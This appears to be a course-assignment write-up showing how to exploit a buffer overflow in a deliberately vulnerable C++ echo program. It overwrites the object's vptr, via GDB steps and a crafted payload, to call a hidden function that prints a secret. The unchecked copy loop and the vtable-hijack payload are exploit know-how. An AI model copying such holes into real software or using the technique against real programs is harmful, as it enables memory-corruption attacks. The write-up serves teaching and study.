# Exploiting-bof-to-exec-func
This write-up is for mmn12 in the course defensive system programming. <br>
The goal: to execute the function `unreachable`.
### First we need to compile the code:
```python
g++ -g3 -m32 mmn12.cpp -o mmn12q2
```
* `-g3` flag: provides maximum of debugging information.
* `-m32` flag: compiles the codes into a 32-bit program (so addresses are easier to work with).


By reading the main function, we can see that it works with command line arguments (argv[]),
and that unless we set the enviroment variable `ECHOUTIL_OPT_ON`, `do_escape` will be false,
and it will simply echo all the arguments.
So let's set `ECHOUTIL_OPT_ON`:
   
```python
export ECHOUTIL_OPT_ON=yes
```

By playing with the `-e` and `-n` flags offered by the program,
we can see it doesn't seem to do much.

#### Only when entering an input that follows the terms:

   ```python
  if(do_escape && s[0] == '\\')
        handle_escape(s);
   ```
  We head to a more interesting part of the code.

## Buffer overflow
Let's look at at source of `handle_escape`:

```python
void handle_escape(const char* str)
{
   struct
   {
      char buffer[16] = { 0 };
      Handler h;
   } l;

   // copy only the characters after the escape char
   const char* s = str;
   char* p = l.buffer;
   s++;
   while (*s)
      *p++ = *s++;
  //handle different options
   switch (l.buffer[0])
   {
   case 'x':
      l.h.interpret(l.buffer);
      break;

   default:
      fputs(str, stdout);
   }
}

```
This function declares a struct that has a `buffer` of size 16 bytes and an `Handler` which we will examine closely soon.
We can notice that the parameter `s` that is in fact a `command line argument`, is copied to the buffer of 16 bytes without any
length verification.
But even if we pass a very long input, the program doesn't seem to crash.

![very_long_input](https://github.com/H3NGO1U/Exploiting-bof-to-exec-func/assets/100107865/4986bafa-f647-49dd-9954-8b581e7710b7)

If we look at the declaration of the struct l, we see that right after the buffer there's the `Handler` object.
Also we see that the function `interpret` of `Handler` is called if we write the char `x` after the \\\\.

#### So let's examine the Handler object:

```python
class Handler
{
   virtual void unreachable()
   {
      printf("%s", VERY_SECRET_PASSWORD);
      exit(0);
   }

   virtual void helper(const char *str)
   {
      std::string s = "0" + std::string(str);
      unsigned int x = std::stoul(s, nullptr, 16);
      printf("%c", x);
   }

public:

   void interpret(const char* str)
   {
      helper(str);
   }
};

```
So here we notice two interesting things:

1. `interpret` is just a wrapper function that calls the virtual function `helper`.
2. `unreachable` is also a virtual function


## Overriding the vptr
The vptr is the pointer to the vtable, that holds all the addresses of the virtual functions of the object.
It is usually located at the begining of the object.

So, we need to overflow the buffer in a way that instead of calling to `helper`, `interpret` will call the `unreachable` function.

## Time for some GDB!
First, we will enter 15 character after the \\\\x (so with the x it is 16 and there's no overflow)
to track the process of calling to `helper` and collect some interesting addresses:

```python
gdb --args mmn12q2 -e \\x$(python -c "print('a'*15)")
```

Let's first type:

```python
set print asm-demangle on
```
This prints C++ names in their source form rather than their mangled form.

We should set a `breakpoint` at the function `Handler::interpret`, which is where `helper` is called
and we probably will find the address of the `vtable` in the registers there.

```bash
b Handler::interpret
```

Then type `r` and gdb will run until getting to the breakpoint we set.

<img width="716" alt="vptr_find" src="https://github.com/H3NGO1U/Exploiting-bof-to-exec-func/assets/100107865/76f9c717-a7b4-4b4d-a0a6-25152cc8d4b3">


So we know now that `0x56558ec8` is the address of the vtable.
Let's check it:

```bash
x/4x 0x56558ec8
```
<img width="666" alt="vtable_chk" src="https://github.com/H3NGO1U/Exploiting-bof-to-exec-func/assets/100107865/93e45571-099d-4d4a-acc7-716653b9c6da">

Yes!! 
And the first function there is indeed the `unreachable` and the second is `helper`.

## Exploit time
When function from the vtable is invoked, it is done with `vtable address + offset`.
So when our program calls the `helper` function, it basically calls the "function that is located at the address of vtable + 4 bytes".
But thanks to the buffer overflow, we now control the vtable address that is used!

So the plan is:
send to the program 15 normal charaters + *the address of vtable minus 4 bytes*
so when the program *adds* 4 bytes, we will reach exactly to the unreachable!

## Finally
Let's type the following command in gdb:

```python
r -e \\x$(echo -e "aaaaaaaaaaaaaaa\xc4\x8e\x55\x56")
```
<img width="961" alt="final" src="https://github.com/H3NGO1U/Exploiting-bof-to-exec-func/assets/100107865/04ee5239-4a4a-4ece-9463-895b7efbf362">


